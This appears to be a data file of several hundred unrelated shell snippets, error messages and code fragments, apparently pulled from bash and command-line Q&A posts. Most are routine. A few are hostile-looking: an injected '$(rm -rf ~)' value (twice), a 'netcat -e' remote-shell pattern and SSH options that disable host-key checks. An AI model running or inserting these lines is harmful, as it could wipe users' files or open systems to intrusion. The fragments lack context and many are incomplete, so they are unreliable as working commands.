./kafka_prefill.sh | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" | grep '[0-9]*\.[0-9]*[G][:space:]*\.\/[bbg-sevent-test-][0-9]*' > data3.txt
grep: Invalid range end
2.2G    ./bbg-sevent-test-159
./myscript foo*
./yourscript foo*
./yourscript foo01 foo02 foo03
./yourscript "foo*"
for dir; do
for dir in "$@"; do
for dir in $*; do
for dir in $@; do
"OK string"
grep -q
grep -E
ls -l
ls -l /dev/scull
'Device Written'
sudo echo 54
sudo chmod a+rw /dev/scull
echo "hello, world!" > /dev/scull
cat < /dev/scull
ls -l
-rwxr-xr-x   1 root root  413 Dec 30 03:39 ip_addr
chkconfig --list
ip_addr  0:off  1:off  2:on   3:on   4:on   5:on   6:off
systemctl enable ...
exit 0
exit 0
find .... -exec
awk '{print $2}'
$echo "Hello,world!"
$echo "Hello,world\\!"
$echo "Hello,world!"
$echo "Hello,world\\!"
load average
man top
sed 'N;s/\n/ /'
echo "$value"
echo $?
[ ]
$(( expression ))
-i [SUFFIX]
sed -i -e 's/foo/bar/g' $file
perl -pi -e 's/foo/bar/g' $file
date > date.txt
if [ 10 > $1 ]
declare -A $name="( [one]=uno [two]=dos [three]=tres )"
line 126: warning: here-document at line 107 delimited by end-of-file (wanted _EOF_)
vagrant ssh -c "command"
vagrant ssh -c "mysql -u root -proot -e \"update wp_options set option_value='http://myNEWvalue' where option_value='http://myOLDvalue'\" mydbname"
vagrant ssh -c "set -x; mysql -u root -proot -e \"update wp_options set option_value='http://myNEWvalue' where option_value='http://myOLDvalue'\" mydbname"
echo "update wp_options set option_value='http://myNEWvalue' where option_value='http://myOLDvalue'" | vagrant ssh -c "mysql -u root -proot mydbname"
"image.jpg                                                           "
find . -depth ...
./az.sh -a -b -c
sed -n '/A/,/B/p'
tmpfile=$(mktemp); sed -n '/<BEGINHMM>/,/<ENDHMM>/p' proto >$tmpfile; sed -i .bak "r $tmpfile" monophones0.txt; rm $tmpfile
man bash
help while
help test
help for
>/dev/null 2>/dev/null
unzip -q
mv phpMyAdmin-4.5.3.1-english/* .
rm -rf
rm -f
cat file | sed "s/x/y/g" > output
sed "s/x/y/g" file > output
openssl rand
sed 's/redis:\/\/:.+@/{&}/g' config.json
git add .
git okpush
git cam "ok"
sudo mkdir ?????
if ping ...; then echo online; fi
cat queryips.txt
nmap -iL queryips.txt -sn -n -oG upips.txt
-iL queryips.txt
-oG upips.txt
cat upips.txt
function1, function2, ...
GNU Parallel
man date
echo "${DATESTAMP} ${INPUT}" >> "$LOGFILE"
echo "${MY_EXTIP}" > "${CURRENT_IP}"
echo "${SSH_TUN_IP}" > "${SSH_PIDFILE}"
npm packages
npm install
bash manual
go test
echo -e "$var"
printf %s "$var"
| tee tmpfile
cat /dev/stdin
man bash
man screen
bash -l
while :
a b
c d
ping mysql.server
telnet mysql.server 3306
1 MB
50 KB
/ /
-bash: nano: command not found
-bash: ls: command not found
defaults write com.apple.finder.AppleShowAllFiles YES
-bash: defaults: command not found
echo $PATH
bash pre-push
git --work-tree=<path>
git rev-parse
git --work-tree=$tmpdir checkout $lsha
node secret.js
git bash
winpty bash
grep 'A temporary password is generated for root@localhost' /var/log/mysqld.log | tail -1
mkdir -p
wc -l
wc -l
grep -o
wc -l
gnu awk
declare -p pinIDs
set -x
static library
300 mb
source .zshrc
source .bashrc
echo $SOMETHING
free -m
$(free -m)
free -m
free -m
free -m
numscr=`ps aux | grep ScreamDaemon.sh | wc -l`;
echo "$str"
grep [S]creamDaemon.sh
-bash: /opt/local/bin/vim: No such file or directory
which vim
hash -r vim
wc  *
gnu wc
find . -maxdepth 1 -type f -exec wc {} \;
a = 1976
b = 1
/bin/bash -c command_string
man bash
/bin/sh -c YourCommandHere
. After that shell executes your command, so it starts
. This command also spawns
cron -> sh -> python -> python
express: command not found
ejs: command not found
"npm WARN unmet dependency /usr/lib/node_modules/block-stream requires inherits@'~2.0.0' but will load"
nano <path to file>
unescaped newline inside substitute pattern
-d ';'
-f 2,6-
read -r
rem1=$(echo "$remaining" | cut -d";" -f1)
remaining=$(echo "$remaining" | cut -d";" -f4-)
grep -E "^Cookie:.*PHPSESSID.* id=[^ ]+$"
[^ ]
[[ ]]
man pax
$(ls folder1/folder2/)
sort -t; -k3,3n -k1,1
grep -o 35
(i for i in f.read().split() if '35' in i)
[^ ]*
file Fractal.o
file /bin/ls
svn diff
svn diff --summarize
od -c terminal.txt
file terminal.txt
cat terminal.txt
$ chmod +x snapshot.sh
0 >= 0
not number
ps -ef
./my_process.sh | tee -a my_log_file.txt
docker run --memory=X
java -Xmx cat /sys/fs/cgroup/memory/memory.limit_in_bytes
-XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap
kill -INT <pid>
2009:06:15 02:17:00
\n20$3:$1:$2 $4:$5:00\n\t
/usr/local/bin/exiftool -overwrite_original_in_place -preserve '-AllDates<${Filename;s/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})(.*)\.[^.]+$/20$3:$1:$2 $4:$5:00/}' DIR
find: Der Pfad muß vor dem Suchkriterium stehen:  -not -path "./cache/*"
echo $variable
echo $variable2
$(cat file)
$(< file)
while (( ... )); do
while $(( ... )); do
DEV=${(lsblk -no KNAME,MODEL | grep 'ModelNAME')%%'ModelNAME'}
tabs of window 1 doesn’t understand the “count” message
settings set
my_string="-D-K4_NNNN_M116_R1_001.gz _D-K4_NNNN_M56_R1_001.gz R-K4_NNNN_KQ9_R1_001.gz D-K4_NNNN_M987_R1_001.gz _R-K4_NNNN_M987_R1_001.gz"
for i in $my_string; do echo $i | grep -E -o "^*?[RD]"; done
(^| ).?(R|D)
touch source/d
file1, file2
at now < test.sh
Get Selected Finder Items
echo "$some variable"
ping -c 25 google.com | tee /home/user/myLogFile.log
other_cmd | utility file1
Couldn't resolve host '@github.com'
ssh-keygen -t rsa -C "your@email"
Users/<your user>.ssh
SSH keys
Add ssh key
sed -n
y=$(ls -Ap | grep "/$" | sed -n "$ip")
echo $y
-name "**"
$@ > "${curfile}"
set PATH=%PATH%;/path/to/mongo
export PATH=$PATH:/path/to/mongo
curl "$header" -w "http code: %{http_code}\\n" -X POST -d "$BODY" "$URL"
cmd='rm file1.txt'
in window 1
do script
window 1
System Events
echo "\n"
( )
bash -c
[[ ! -e $1 ]]
while read
> out.txt
-type f
ls -q
ls -b
printf '%q'
| espeak
do something ; do something else
do something else
if ... then ... else ... fi
command && 'next cmd if 1st succeeded'
command || 'next cmd if 1st failed'
if [ ... ]; then
if test ... ; then
[ ]
$ find . -iname "*.dwp" -exec bash -c 'mv "$0" "${0%\.dwp}.html"' {} \;
$ find . -name ".DS_Store" -exec rm {} \;
-iname "*.dwp"
-exec expression {} \;
bash -c 'mv "$0" "${0%\.dwp}.html"' {}
bash -c 'mv "$0" "${0%\.dwp}.html"' a.dwp
mv a.dwp a.html
My name
-e string
Run command
not a tty
sudo sudo -u nobody your-program
exec.Command("who am i").Output()
echo "Dec 10 03:39:13 cgnat2.dd.com 1 2015 Dec 9 14:39:11 01-g3-adsl - - NAT44 - [UserbasedW - 100.70.24.236 vrf-testnet - 222.222.34.65 - 3072 4095 - - ][UserbasedW - 100.70.25.9 vrf-testnet - 222.222.34.65 - 16384 17407 - - ][UserbasedW - 100.70.25.142 vrf-testnet - 222.222.34.69 - 9216 10239 - - ]" | ./output.sh
[UserbasedW - 100.70.24.236 vrf-testnet - 222.222.34.65 - 3072 4095 - - ]
[UserbasedW - 100.70.25.9 vrf-testnet - 222.222.34.65 - 16384 17407 - - ]
[UserbasedW - 100.70.25.142 vrf-testnet - 222.222.34.69 - 9216 10239 - - ]
cat not-really-broken.csv |sed -e ':a;N;$!ba;s/\([^"]\)\n/\1 /g' -e 's/ /\n/'
make shell-sys
/profile /bash /zsh
$(wildcard ...)
@echo $(SHELLS)
@echo /profile /bash /zsh
echo /profile /bash /zsh
/profile /bash /zsh
@echo /etc/profile /etc/bash /etc/zsh
$(eval ...)
chmod +x script
exit 1
ps aux | grep python
docker attach
CMD [ "echo", "$HOME" ]
CMD [ "sh", "-c", "echo", "$HOME" ]
CMD "python index.py > server.log 2>&1"
CMD ["/bin/sh", "-c", "python index.py > server.log 2>&1"]
command: bash -c "script_or_command > /path/to/log/command.log 2>&1"
docker run
ps ax | grep bash
bash -l
bash -l -i
ps ax | grep bash
ps ax
should_create_one_line | expects_one_line
should_create_one_line | validate_one_line | expects_one_line
exit 1
ssh -p 222 ME@ME.com:...
xdg-mime query default application/pdf
which $()
bundle install
bundle install
ssh -o StrictHostKeyChecking=no github.com
sed -n '1~2d'
seq 10|sed '7s/.*/-/'
import glob
import zipfile
No such file or directory
-o UserKnownHostsFile=/dev/null
command not found
df -h
df -h && sleep 20
tmux select-window....
rake 'cron:deliver_email'
ls -1 .
set -o noglob
"bash" "windows" taskkill
start C:/folder/beep 2000 250 100 //r 3
cmd /c echo foo
cmd //c echo foo
x=$(cd /unix/path && cmd //c cd)
|| echo "terminated!"
for c_p
LOAD DATA INFILE
$( echo $check )
xargs find
git xxx
awk 'script' file > tmp && mv tmp file
docker rm <containerid>
tail -f
echo debian | sudo -S rtcwake -m mem -u -t $(date +%s -d '3 days 7:45') && sudo -u debian -i bash $HOME/kiosk/bin/startup.sh &
ps -ef | ... | grep iperf
ps -ef | grep -v grep | grep $service
/bin/sh --version
printf %q
-e 's/\$foo\b/bar/gi' -e 's/\$baz\b/qux/gi'
sed -e 's/\$foo\b/bar/gi' -e 's/\$baz\b/qux/gi'
set_password <hint>
new password:
retype new password:
with os.chdir
fatrace/fatrace -t | grep "/home/eric/test.txt"
shopt -s nocaseglob
Dec 10 03:39:13 cgnat2.dd.com 1 2015 Dec 9 14:39:11 01-g3-adsl - - NAT44 -
[UserbasedW - 100.70.24.236 vrf-testnet - 222.222.34.65 - 3072 4095 - - ]
[UserbasedW - 100.70.25.9 vrf-testnet - 222.222.34.65 - 16384 17407 - - ]
[UserbasedW - 100.70.25.142 vrf-testnet - 222.222.34.69 - 9216 10239 - - ]
... while read -r line; do array+=("$line"); done < <(sed ...)
input_variable = 1
input_variable = 01
sed -e "s/\0" <<< "$input_variable"
printf -v
echo ls -l -a / | xargs sh -c
echo '"ls -l -a /"' | xargs sh -c
grep CRON var/log/sys | tail -5 | grep "cd /home/raka/repo && git status"
exit status 2
xargs -L 1000
xargs -L 1000
jq  '.[].addressLineOne' yourfile.txt
jq  '.[2].addressLineOne' yourfile.txt
jsawk 'return this.addressLineOne' -a 'return this[0]'
<<< "a_b"
< <(tr "_" "\n" <<<"a_b")
php -v
php -v
php -v
php70 -v
line 37: testdir/.hidd1/: syntax error: operand expected (error token is ".hidd1/")
searchDirectory ${directories[$i]}
for i in "${directories[@]}"; do
searchDirectory "$i"
for d in *
test -d $d
sed 's/\\caption\s*{\([^}]*\)}/ \\caption {\\scriptsize\\textbf{ \1 } }/g'
\\caption {\\scriptsize\\textbf{ \1 } }
slurp mode
Build with Parameters
--param1=val1 --param2=val
cp shapeit /usr/local/bin
local var
declare var
cd /home/usr/data/folder_L711
^r cd
python script.py
ipython script.py
this is not
this is a test
this is a
BEGIN {OUTPUT=0}
help \d
push repo "message"
startdocker 004
startdocker 004
'{print $2}'
{print $2}
Seq("awk", "{print $2}")
netcat -e $prog
nohup python -u myscript.py &> ./mylog.log &
return 0
return 0
grep -c
find /tmp/sdsa -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2- | head
hadoop fs -ls -R /tmp/app | awk -F" " '{print $6" "$7" "$8}' | sort -nr | head -1 | cut -d" " -f3
stat -c%s
stat -f%z
print \" \"$0
{print }
date | awk '{print $5}'
-x 3
script.sh -x 3
-s 2
script-launcher.sh 42
-c 'core.bare=false'
git add
ls -S
man stat
sort -r
sort -n
grep -e 'com.test.data' debug.log --color -v > test.log
sed 's/com.test.data -\(.*\)2016-01/\1/' debug.log > test.log
sed '/'com.test.data -'/,/2016-01/ s/[a-z]*// p' debug.log > test.log
for f in "$logfile"
docker build .
exec: "/bin/sh": stat /bin/sh: no such file or directory
cannot enable tty mode on non tty input
docker exec
local SOME_VAR='some value'
test -x
man test
export EDITOR='subl -w'
egrep -x '[[:lower:] ]*'  $DIR/$file | egrep '( [[:lower:]])|([[:lower:]] )'
grep Hwaddr
head -1
tr -s ' '
cut -f 5 -d' '
tr -d ':'
head -1
Link encap...
tr -s ' '
cut -f 5 -d' '
tr -d ':'
$0 ~ /REGEX/{print}
docker run -p 3000:3000 -d -e "DOCKER_HOST=$(ip -4 addr show docker0 | grep -Po 'inet \K[\d.]+')" somerepo/image:tag
App 10040 stdout: D, [2016-01-10T11:40:07.085516 #10040] DEBUG -- : MONGODB | getaddrinfo: Name or service not known
npm update -g npm
sudo ./nginx-install.sh
sudo ./nginx-install.sh -s example.com
$(($n + 1))
"$(command "$var")"
"a & b"
'single quotes'
$'s: 'Costs $5 US'
ssh host 'echo "$HOSTNAME"'
mystr --to-upper somestring
mystr --starts-with sss somestring
mystr --contains bbb sometring
mystr --suffix somestring
mystr --trim somestring
mystr --match "some.*" somestring
mystr --find-match "some(.*)" somestring $1
echo something | tr "[:lower:]" "[:upper:]"
echo stuff | grep -q '^stu'
echo stuff | grep -q 'tuf'
echo stuff | grep -q 'uff$'
echo ' hello ' | sed  's/^[[:space:]]*//g' | sed 's/[[:space:]]*$//g'
echo somestring | grep -q '^some.*$'
echo somestring | grep -q 'some.*'
git status
grep -o
echo $temp
all my directory listing and the expected result
echo "$temp"
git branch
sed -r
(svn info | grep URL:)
echo$(svn info | grep URL:)
expr index $string
expr substr $string 1 $((pos+2))
${myvar: -2}
C:\Program Files (x86)\Git\bin\bash.exe
-v ip=$1
-v name=value
#!/home/jenkins/.rvm/gems/ruby-2.1.8 ruby
#!/usr/bin/env rvm 2.0 do ruby
which ruby
which ruby
version sort
sort -V
sort -t, -k
-d, --dictionary-order   consider only blanks and alphanumeric characters
function playmp3() {
cat sample.txt
\pset tuples_only
\pset format unaligned
truncate table
print 99
chmod a+x test.py
echo $a
version number
version number
cat *
$ cat file1 file2 file3 file4 file5 file6 > out.txt
cat /storage/system/abcd.txt\r
git ls-files -m
git diff-index --quiet HEAD
git status
git update-index --refresh -q
git update-index --refresh -q
git update-index --refresh
git status
git update-index --refresh
git status
git update-index --refresh
git status
git update-index --refresh
git update-index --refresh
built.io flow
tail -f
timestamp = ...
crontab -e
*/5 * * * * /path/to/script.sh
date +"%M"
date +"%M"
date +"%M"
osacript -e '...'
cat $file | grep "22/open" | awk '{print $2}' > $results/service_ssh
tr 'A-Z' 'a-z'
+ 0
if (NR) print count + 0
-o "1.1 1.2 1.3 1.4 1.5 0 2.4"
-exec rm -rfv {} \;
-mtime +2
rsync -avu /path/to/MyLocalFolder/. -e 'ssh -p ssh_port' user@remote_server_ip:/path/to/MyRemoteFolder
diff MyLocalFolder MyRemoteFolder
diff MyLocalFolder MyRemoteFolder | grep 'MyRemoteFolder' | awk '{print $4}' > dont-remove-these-files.txt
rsync -avu --delete --exclude-from 'dont-remove-these-files.txt' MyLocalFolder/. MyRemoteFolder
<(python ...)
< <(...)
while read
IFS= read -r -d ''
-d ''
source ~/.bashrc
systemctl status parserservices
sudo service parserservices start
sudo bash -x /etc/rc.d/init.d/parserservices start
systemctl daemon-reload
a \ text
ls /
get /
get /
zkCli.sh -server myserver get /hbase/master 
grep -E
awk /^d/ '{ print $8 }'
(( ++i ))
echo "${CONTENT[@]}"
DirContent some_directory
echo some_directory/*/
shopt -s dotglob
find -exec \+
echo mv
find $DST -type f -mtime +7 -name '*.TIF'
find $DST -type f -mtime +7 -name '*.TIF' -execdir rm -- {} \;
if ! [ -f "$DST/$FINDFILE" ]; then
if ! [ "$DST/$FINDFILE" ]; then
w -h oneUser | awk
compatible mode
cat datasets/q11data.txt | sed -ne '/(\*[0-9\]*[A-Z][a-z])/p'
./myProgram | tee > (myLogger log.txt) | head > firstLines.txt
head log.txt > firstLines.txt
[1]+  Stopped
man bash
grep -oP
pip uninstall virtualenvwrapper
-bash: /usr/bin/virtualenvwrapper.sh: No such file or directory
mkdir $HOME/.virtualenvs
export WORKON_HOME=$HOME/.virtualenvs
source /path/to/this/file/virtualenvwrapper.sh
source ~/.bashrc
mkvirtualenv temp
workon temp
> yolo.txt
cat yolo.txt bar.txt
uniq -u
printf %q
eval "$mysql_genpass"
printf -v var ...
var=$(printf ...)
gcc -v
line 18 Bash error: syntax Syntax error: unexpected end of file
"${tgz##*\.}" == "tgz"
> outfile.txt
subprocess.Popen(..., shell=True)
luigi --module myTask --parameters cats
myTask --parameters cats
alias myTask='luigi --module myTask "$@"'
alias myTask='PYTHONPATH=$PYTHONPATH:/path/to/myTask/dir luigi --module myTask "$@"'
export PYTHONPATH=$PYTHONPATH:/path/to/myTask/dir
% 8
-F ' *: *'
sub("^[^:]*: *", "")
FS=[ ]
perf stat -o stat.log ./a.out
perf stat
perf stat
perf stat
perf stat
rake db:create
nm -gU
print f
--exclude 'backup/*'
--exclude 'backup'
--exclude=PATTERN       exclude files matching PATTERN
$( ... )
conda search --canonical -f "$PACKAGE"
head -1
/usr/bin/env perl
/usr/bin/env xxxxxx
which f
which: no f in (...)
type f
type f
f ist /tef/tegf/06_CAE_System/064_soft/PERL_SCRIPTE/bin/f
command -v
type -a f
type f
cut -f1 -d' '
read -ra
Hangup: 1
wait $target
bash: wait: pid 1234 is not a child of this shell
cp ~/file_{1..7}.dat .
open http://localhost/
open -a "Google Chrome"
alias chrome="open -a 'Google Chrome'"
chrome filename
chrome url
open -a Google\ Chrome
open stackoverflow.com
ctrl + c
2> /dev/null
read -e -p
man 5 termcap
a="hello my dear friend"
${a%% *}
echo '5.1+5.3' | bc -l
(declare a=5; echo $a)
sleep 1 &
(sed '1,/stringtodetect/d' "$file")
sed -i
sed -i.backup
sed '1{/gotcha/d;}'
everything before a char
everything after a char
-F '<\|>'
-F '<\\|>'
-F '<\\|>'
gnu makefile
adb shell
-s _device_
sh /sdcard/screenshot/sh
set -x
$? -ne 1
$? -ne 0
env -i
bash -version
--noprofile --norc
export PATH="$PWD:$PATH"
[[http into [^[^
[[ into [[admin:
[^[^ into [[http
done < $1
man stat
stat -c%Y file
basemodtime=$(stat -c%Y file)
modtime=$(stat -c%Y file)
if [ $modtime != $basemodtime ]; then
history -s
file0001.ext, file0002.ext ... file0010.ext ... file0099.ext ... file 0100.ext ... file0999.ext, file1000.ext
./rename.sh new_file pdf /home/dir/something/
mv something file0012.txt
own_window_type normal
shopt -s nullglob
rsync -a -f"+ */" -f"- *" source/ destination/
man bash
[[ ]]
beast watch
grunt "$a" &>/dev/null
if [ $? -eq 0 ]
cd ~/root
return ${returnvalue}
bash: pacman: command not found
pacman -Syuu
pacman -S openssh
ps | grep | blabla
$ ./pidder some_command
$ some_command
-v RS=' '
$0 ~ s
expr string : regex
set -e
set -e
set -e
is_edited=$(grep "foo" $base_dir/some-file.txt)
is_edited=$(grep "foo" $base_dir/some-file.txt || true)
set -e
sed -n
sed -n
{ }
grep -F
Foo [Bar]
-I '{}'
bash -c
$(rm -rf ~)
read(0, &buf123, 1);
execl(bash -c "id")
read(0, &buf123, 1);
man ls
/(.+\w){3} (.*;)?sd=/
eval "$cmd"
pm2 start index.js --name="fizzbuzz" --watch
pm2 start index.js --name="fizzbuzz" --watch
__bold__ not bold __bold__
wc -l
inline code can have * and ** and _ to be ignored
export VAR1=... VAR2=...
ambiguous redirect
>> "$(...)"
No such file or directory
printf $VAR2
printf "$VAR2"
printf %s "$VAR2"
>> "$VAR2"
/usr/bin/env bash
result != 0
set -o pipefail
/bin/sh: 1: set: Illegal option -o pipefail
'some_program --an-option  | tee -a ' + logfile
some_program --an-option  | tee -a ' + logfile
.pth files
>login invALID
echo "Enter your name"; read
< emp.txt
< <(tail -n +2 emp.txt)
man paste
get brightness level > add 5%
export foovariable=1
source my_script.sh
aws configure set help
aws configure set aws_access_key_id AKIAI44QH8DHBEXAMPLE
aws configure
aws configure --profile qa
COPY credentials /root/.aws/credentials
COPY config /root/.aws/config
aws configure set help
aws configure set help
aws configure set aws_access_key_id "$AWS_ACCESS_KEY_ID" --profile profile_name_here
aws configure set aws_secret_access_key "$AWS_SECRET_ACCESS_KEY" --profile profile_name_here
aws configure set region "$AWS_REGION" --profile profile_name_here
aws configure set output "json" --profile profile_name_here
java -cp myjar.jar mypackage.MyClass
ctrl a+d
screen -r
op1=$2; val1=$3
print $1 " " (op1 == "withop" ? val1 " " val2 : val2 " " val1)
(op1 == "withop" ? val1 " " val2 : val2 " " val1)
which F77
which F77
which gofortran
export F77=/path/to/gofortran
which $F77
in 02
16 00
in 02
GNU GREP
screen attach
tmux attach
R 3.2.2
rm(list = ls())
nvm use 4.0
sh say.sh Text here
sh say.sh "Text here"
find . -name "*2014*" | xargs -0 sed -i 's/2014/2016/g'
rename s/2014/2016/ *2014.pptx
find -name \*2014.pptx -exec rename s/2014/2016/ {} \;
LIST OF ITEMS
stty sane
tput rs1
stty sane
vi ~/.profile
second {
<< EOF
--trace <outfile>
-d 'last week'
echo $a
echo "$ret"
echo $ret
echo "$ret"
git xxx
-m 1
-f file
cut -d","  -f1-2 name.txt
NR == 1
find ! -type l
find -type d
decrypted = sh("./decrypt" ENV[ENCRYPTION_P12])
command1="screen -dm -S $name feh *.jpg"
[ "$(screen -S loop1 -X select . ; echo $?)" != 0 ]
if <command>; then ... fi
screen -S loop1 -X select .
"C:\Program Files\Git\usr\bin\sh.exe" --login -i
"C:\Windows\SysWOW64\cmd.exe /c &quot;&quot;C:\Program Files\Git\usr\bin\sh.exe&quot; --login -i&quot;"
bash clean.sh
if [ -f IMG_1 IMG_2 IMG_3 ...
shopt -s nullglob
-maxdepth 1
find . -maxdepth 1 -name "IMG_*" -or -name "log_errors.txt"
single domain
name servers
MAKE_VERSION=$(make --version 2>&1 | awk '/Make/ {print $2}')
make --version
title="Main Menu"
go back
[a-zA-Z ]
[a-zA-Z \d]
create table
create schema
sh script.sh
bash script.sh
which python
/usr/bin/env python
readlink -f
/usr/bin/env python
alias | grep python
$ python
hash -r python
sed -i 1d file | whatever
tail -n +2 xxx > xxx.tmp && mv xxx.tmp xxx
echo "$k"
printf %s\\n "$k"
ls -ltrh
01/18/2016 14:41
docker pull debian
docker run debian
man grep
man bash
./decrypt "$(./crypt some_argument)"
$4 == 0
-F '[;[:blank:]]+'
make install
$(rm -rf ~)
-d ''
sh scriptname
printf "%s", $1
yesCount=gsub("y", "")
printf " %s\n", yesCount
sort -t ' ' -k2,2,nr
-t ' '
for (r in rank) print rank[r], votes[rank[r]];
export VAR
FOO=hello perl -MEnv -E 'say $FOO'
-j 4
-j 4
-j 4
sudo ionic emulate ios
cd ..
cd ..
workon project
You choose y|n
you did not choose y
exec_A | exec_B
exec_A &> buf ; exec_B < buf &
ls * | tee subdir/0
man pg
$(stty size|cut -d' ' -f1)
awk '<whole script>'
awk {'<rest of script>'}
which test
grep -oP
bash bash_program.sh
sh /path/to/script
echo foo${var}
echo foo               bar
echo ${var}
echo                bar
echo "foo${var}"
echo "foo               bar"
add / commit
pull / push
done | sort
wget http://{base_url1,base_url2}/image{1..3}.jpg
npm --version
bower -v
sudo bower -v
bower install bootstrap#v4.0.0-alpha.2
ls -l <file or directory name>
drwxr--r-- 1 owner group...
man chmod
heroku run
bash: payments: command not found
No such file or directory
-s signal
kill -9
kill -15
-P 4
-n 1
xargs -P
regedit /c reg.txt
cat /h/xyzzy/plugh.txt
cmd /c
cmd /k dir
cmd /c dir
cmd /k otherscript.cmd
regedit /c reg.txt
cmd /c dir
file pic.jpg
[ ... ]
[[ ... ]]
[ ... ]
[ ... ]
[[ ... ]]
file -b
cat /home/kgh/abc.CSV | awk -F, '$2 ~ /^[[:digit:]]+$/'
cat /home/kgh/abc.CSV | awk -F, '$0 ~ /^[[:digit:]]+$/'
:set list
'0-9, -'
egrep -ie "<*HREF=(.*?)>" index.html | cut -d "\"" -f 2 | grep ://
egrep -ie "<*HREF=(.*?)>" index.html | awk -F\" '{print $2}' | grep ://
$(cat file1)
foo  bar
tar -cf a/b/c/tarfile.tar -C a/b/c foo
tar tvf
gh-clone-latest Owner Project
gh release list
>word 2>&1
-v FPAT='"[^"]*"|[^,]*'
sleep 20
fullname = 'file.jpg'
fullname = newfiles
mv web/source/php/class.DBCredentials.php web/source/php/class.DBCredentials.php.bak
git rm web/source/php/class.DBCredentials.php
git commit
mv web/source/php/class.DBCredentials.php.bak web/source/php/class.DBCredentials.php
mysql -u root -p
mysql -u root -h 127.0.0.1 -p
awk version 20070501
emacsclient /filename -nw
ec file.txt
C-x C-c
bash -c
cat "$sorted_file1"
cat $'X\nY\nZ'
cat sorted_file
/^ *x.*/
shopt -s extglob
shopt -s extglob
shopt -s extglob
nohup ./pipeline.sh &
time ./a.out
<\ \>
local local_var=$1
local <whatever>
grep -A
cat ./BookDB.txt | egrep -ie "\b""$title""\b" | egrep -ie "\b""$author""\b"
cat ./BookDB.txt | grep -i "$title"
sudo -u plain_user command
parameter=value command
GNU bash, version 4.3.42(1)-release (x86_64-apple-darwin15.0.0)
sed '/WORD1/,/WORD2/d' input.txt
#include "name.h"
AVG = .333
grep ^user= mylogfile.txt
gcc -std=gnu99 -o .....
file ./fileName
GNU sed
print $0
\tnew line1
command line
2016-01-21 17:15:06.614852743 +0300
for f in *.com
cat <(...) "$f"
mv -f "$f.new" "$f"
/bin/sed -nf
sed -i -f remccoms3.sed
bugfixed to some extent
grep --include='*.java' -Ri 'System.loadLibrary' *
if [ "grep --include='*.java' -Ri 'System.loadLibrary' *" = 0 ] then ...
grep -q
tail -n +3 "$argv[1]"
man head
man dd
jobs -s
Get Selected Finder Items
Run Shell Script
Pass input:
as arguments
sudo crontab -e
=> "{name:'/dev/input/event16',id_serial:'Logitech_USB_Receiver'}"
<%= device.name %>
<%= device['name'] %>
/^A/ && /IMPORTANT/
man bash
Warning: <stdin>: syntax error in line 1 near '16'
uedit32 .bashrc
"/C/Program Files (x86)/IDM Computer Solutions/UltraEdit/uedit32" .bashrc
-O expand_aliases
shopt -s expand_aliases
set +m;
&& exit
git pull
bash: no job control in this shell
ls >files
cat /proc/meminfo | grep MemFree | awk '{ print $2 }'
free -m | awk '/^Mem:/{printf("%.1fGb\n",$2/1000)}'
npm run build
#!/usr/bin/env bash
"scripts": { "build": "bash ./file_name.sh" }
-F ,
new-branch-name: develop: command not found
cut -f1 -d " "
awk '{print $2}'
kill -TERM
cat file2 >> file1
cut -d : -f 1
./myscript *.pdf
cp log.ok filter.txt
grep -vf filter.txt log.nok
"ls $1"
$(ls "$1")
for file in "$1"/*
sort -R
exec("script.sh", $output)
echo "abc" > foo.fifo
while true; do read...
ls | sort > new_list.txt
sort missing.txt > old_list.txt
comm -23 old_list new_list
scriptname '\/-2])*' 'cat'
sed "s/'"$from"'/'"$to"'/g"
scriptname 'dog c' 'cat'
sed: 1: "c'/'cat'/g": command c expects \ followed by text
echo foo > bar
M-x find-grep
M-x find-grep
Run find (like this): find . -type f -exec grep -nH -e  {} +
find . -iname '*.java'
find . -type f -exec grep -nH -e () +
find . -iname '*.java'
C-u M-x find-grep
file1.txt file2.txt "new file.txt"
'file1.txt' 'file2.txt' 'new file.txt'
'file1.txt' file2.txt' 'new' 'file.txt'
new file.txt
new file.txt
#! /bin/bash
chmod 755 filename
echo $pid >> myfile.txt
sed -i sedscr pom.xml
yyyy-mm-dd hh:mm:ss
tail -f
tail -f
eval "$VAR"
sudo -s
sudo su
set -x
"New book title '$bktitle' added successfully!"
"New book title '"'$bktitle'"' added successfully!"
New Book title 'BASH' added successfully
New book title '$bktitle' added successfully!
New book title $bktitle added successfully!
\escape sequences
egrep '^[0-9]+[.][0-9][0-9]'
if [[ $line1=
[[ ... ]]
system 'sh', '-c', ...
ack 'trap:'
|| true
&& exit 0
--link c2:myNewContainer2
programname '-r'
grep -l -r
git mv
git config
wc -l
find .
for i in $1
for i in $(ls $dir)
tail -n +2
sed 1d
grep -E 'X|Y|Z' files
-=1=- Folder#1
s/-=\d+=- //
-bash: valgrind: command not found
brew doctor
brew link valgrind
brew install --HEAD valgrind
ps aux | grep runscript.sh
bash pslist.sh
ssh user@ipaddress pslist
echo -e "${user}\r"
ps aux
pgrep bash| (while read -r line; do  lsof -p $line|grep cwd|grep EXPECTED_CWD && echo "GOT $line"; done;)
filecount='ls -l ${survey_dir}${survey_category} | wc -l'
ls -l /bin/bash
#!/bin/bash -x
ffmpeg -i out.avi -hls_segment_filename '%03d.ts' stream.m3u8
[ ... ]
-d ,
unset PYTHONPATH
source activate
PYTHONVERBOSE=1 source activate python2
TSKILL processid
taskkill -f -fi "services eq msiserver"
Keychain Access
Change Settings for Keychain ...
Lock after X minutes of inactivity
Lock when sleeping
security unlock-keychain
(IFS=-; echo ...)
subprocess.call('bash TestingCode', shell=True)
arrayname=($(find -name '*.jpg'))
echo "$arrayname"
echo "${arrayname[0]}"
arrayname=($(find ...))
./file with spaces.txt
for i in $(find ....) ; do ...; done
sed -i -e "s|$VAR1|$VAR2|g"
find ... | while read f ; do .... done
find -exec
local usage()
man bash
source test.sh
n = read(0, buffer, BUFSIZ);
read(0, buffer, 6);
curl -X PUT http://<username>:<password>@localhost:5984/testdb/_design/example --data-binary ‘@design.json’
find -E
man code
grep -F
Ctrl-Alt + D
kill -9 $PID
-v RS='<reportBody>.*</reportBody>'
show sqlcode
$ grep = input.txt  -B1 | grep -v -e "--" | sed "N;s/\n/ - /"
join -1 4 -2 2
NR == FNR
$2 in s{print s[$2],$2,$1}
s == 2
tmux ls
sudo apt-get install tmux
cut -d\  -f2
grep -A1
cd foobar
open("foo", O_RDONLY)
cd ./foo
cd foo
cd foo
cd ./foo
cd somewhere
